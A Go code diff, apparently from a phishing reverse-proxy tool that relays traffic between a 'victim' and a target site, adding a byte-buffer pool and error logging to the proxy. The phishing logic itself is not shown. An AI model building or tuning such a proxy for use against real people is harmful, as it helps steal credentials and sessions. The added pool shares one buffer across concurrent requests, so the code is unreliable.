@@ -12,6 +12,7 @@ import (
 	"strings"
 
 	"github.com/PuerkitoBio/goquery"
+	"github.com/valyala/bytebufferpool"
 )
 
 // phishingProxy proxies requests between the victim and the target, queuing requests for further processing.
@@ -20,6 +21,19 @@ type phishingProxy struct {
 	TargetURL     *url.URL
 	JavascriptURL string
 	Logger        *log.Logger
+}
+
+type bufferPool struct {
+	*bytebufferpool.ByteBuffer
+}
+
+// Get massages a *bytebufferpool.ByteBuffer{} into a httputil.BufferPool.
+func (b *bufferPool) Get() []byte {
+	return b.Bytes()
+}
+
+func (b *bufferPool) Put(payload []byte) {
+	b.Set(payload)
 }
 
 // Director updates a request to be sent to the target website
@@ -200,7 +214,9 @@ func New(config *Config) *ProxyServer {
 	reverseProxy := &httputil.ReverseProxy{
 		Director:       phishingProxy.Director,
 		ModifyResponse: phishingProxy.ModifyResponse,
+		ErrorLog:       config.Logger,
 		Transport:      config.Transport,
+		BufferPool:     &bufferPool{ByteBuffer: &bytebufferpool.ByteBuffer{}},
 	}
 
 	return &ProxyServer{
